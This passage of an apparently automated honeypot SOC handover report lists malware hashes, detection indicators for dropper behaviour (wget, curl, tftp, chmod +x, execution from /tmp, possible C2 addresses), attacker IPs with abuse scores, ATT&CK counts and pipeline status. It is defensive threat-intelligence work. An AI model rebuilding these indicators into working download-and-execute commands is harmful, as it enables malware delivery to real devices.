| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` (7a4a3a129b726b531941b41d...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `41.231.85[.]75` | TN | ATI - Agence Tunisienne Internet | **100** ⚠️ | 50 |
| `101.13.1[.]58` | TW | Taiwan Mobile Co., Ltd. | **100** ⚠️ | 46 |
| `95.79.57[.]221` | RU | JSC ER-Telecom Holding Nizhny Novgorod branch | **100** ⚠️ | 50 |
| `50.223.176[.]171` | US | Comcast Cable Communications, LLC | **100** ⚠️ | 50 |
| `175.207.233[.]24` | KR | Korea Telecom | **100** ⚠️ | 29 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |
| `62.192.226[.]83` | RU | Arkhangelsk Television Company | **100** ⚠️ | 50 |
| `122.166.253[.]226` | IN | ABTS (Karnataka), | **100** ⚠️ | 50 |
| `70.120.203[.]193` | US | Charter Communications Inc | **100** ⚠️ | 50 |
| `212.8.242[.]38` | NL | WorldStream B.V. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 74 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 64 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 16 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 15 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 15 |

---

## 🔕 False Positive Summary (15 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 10 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 146 cases |
| Tool 34  | Credential Extractor        | ✅ 86 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 11 fingerprints |
| Tool 36  | Command Clustering          | ✅ 6 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 65 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 15 filtered (10.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 43 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 31 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 64 priority case(s) shown individually · 21 recon entry/entries in table (6 group(s) consolidating 52 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-14T21:04:56Z_
